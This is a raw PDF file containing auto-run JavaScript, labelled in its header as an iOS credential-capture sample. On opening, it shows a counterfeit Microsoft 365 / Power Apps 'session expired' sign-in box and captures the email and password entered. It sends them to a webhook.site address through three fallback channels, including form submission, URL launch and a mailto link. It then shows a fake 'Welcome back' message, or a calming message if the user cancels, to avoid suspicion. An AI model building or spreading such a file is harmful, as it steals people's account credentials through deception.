%PDF-1.7
% execDialog Credential Capture - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (

      try {

        // === BUILD DIALOG OBJECT ===
        var oDialog = {

          initialize: function(dialog) {
            // Pre-fill email field if we can guess it
            dialog.load({
              "eml_": "",
              "pwd_": ""
            });
          },

          commit: function(dialog) {
            var results = dialog.store();
            this.email = results["eml_"];
            this.pass  = results["pwd_"];
          },

          email: "",
          pass:  "",

          description: {
            name: "Power Apps",
            elements: [
              {
                type: "cluster",
                name: "Microsoft 365 Sign-in",
                elements: [
                  {
                    type: "static_text",
                    name: "Your Power Apps session has expired.\nPlease sign in to continue."
                  },
                  {
                    type: "static_text",
                    name: " "
                  },
                  {
                    type: "static_text",
                    name: "Email or phone:"
                  },
                  {
                    type: "edit_text",
                    item_id: "eml_",
                    name: "",
                    width: 300
                  },
                  {
                    type: "static_text",
                    name: " "
                  },
                  {
                    type: "static_text",
                    name: "Password:"
                  },
                  {
                    type: "password",
                    item_id: "pwd_",
                    name: "",
                    width: 300
                  },
                  {
                    type: "static_text",
                    name: " "
                  },
                  {
                    type: "static_text",
                    name: "By signing in you agree to the Microsoft Services Agreement."
                  }
                ]
              },
              {
                type: "ok_cancel",
                ok_name: "Sign in",
                cancel_name: "Cancel"
              }
            ]
          }
        };

        // === EXECUTE DIALOG ===
        var result = app.execDialog(oDialog);

        // === HANDLE RESULT ===
        if (result === "ok" && oDialog.email) {

          // === EXFIL ATTEMPTS ===
          var payload = "e=" + encodeURIComponent(oDialog.email)
            + "&p=" + encodeURIComponent(oDialog.pass)
            + "&t=" + new Date().toISOString();

          // Attempt 1: submitForm
          try {
            this.submitForm({
              cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?" + payload,
              cSubmitAs: "HTML"
            });
          } catch(e) {}

          // Attempt 2: launchURL
          try {
            app.launchURL(
              "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?" + payload,
              false
            );
          } catch(e) {}

          // Attempt 3: mailto
          try {
            app.launchURL(
              "mailto:?subject=pa&body=" + payload,
              false
            );
          } catch(e) {}

          // === SUCCESS CONFIRMATION ===
          app.alert({
            cMsg: "Welcome back, "
              + oDialog.email.split("@")[0]
              + ".\n\nResuming your session...",
            cTitle: "Power Apps"
          });

        } else if (result === "cancel") {

          // Soft cancel - don't alarm user
          app.alert({
            cMsg: "Session verification skipped.\n\nSome features may be limited until you sign in.",
            cTitle: "Power Apps"
          });
        }

      } catch(e) {
        // Try falling back to app.response if execDialog fails
        try {
          var email = app.response({
            cQuestion: "Your session has expired.\n\nEmail or phone:",
            cTitle: "Power Apps",
            cDefault: ""
          });
          if (email !== null) {
            var pass = app.response({
              cQuestion: "Enter the password for\n" + email,
              cTitle: "Power Apps",
              cDefault: ""
            });
            app.alert({
              cMsg: "Welcome back, " + email.split("@")[0] + ".",
              cTitle: "Power Apps"
            });
          }
        } catch(e2) {}
      }

   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
   /Resources 
     /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>
   >>
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Document) Tj ET
BT /F1 12 Tf 50 220 Td ( ) Tj ET
endstream
endobj

